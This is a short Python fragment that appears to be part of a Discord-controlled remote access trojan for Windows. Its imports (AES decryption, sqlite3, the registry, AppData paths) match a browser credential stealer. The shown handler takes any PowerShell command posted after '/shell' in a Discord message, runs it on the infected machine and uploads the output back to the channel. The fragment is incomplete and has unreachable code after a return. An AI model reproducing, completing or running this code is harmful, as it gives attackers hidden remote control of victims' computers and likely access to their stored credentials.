import os, subprocess, requests, re, json, base64, shutil, sqlite3, winreg, configparser
from Crypto.Cipher import AES
from datetime import datetime
from discord import *
import discord

APPDATA = os.getenv("APPDATA")
LOCALAPPDATA = os.getenv("LOCALAPPDATA")
TEMP = os.getenv("TEMP")
CWD = os.getcwd

if message.content.startswith("/shell"):
    command = message.content[7:]
    output = subprocess.Popen(["powershell.exe", command],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE, shell=True
                              ).communicate()[0].decode("utf-8")
    if output == "" or output == "None":
        output = "No output"
    open(f"{TEMP}\\output.txt", "w").write(output)
    embed = discord.Embed(title=f"Shell > {os.getcwd()}", description="```See attachment```", color=0xfafafa)
    file = discord.File(f"{os.getenv('TEMP')}\\output.txt")
    return await message.reply(embed=embed, file=file)
    embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
    await message.reply(embed=embed)

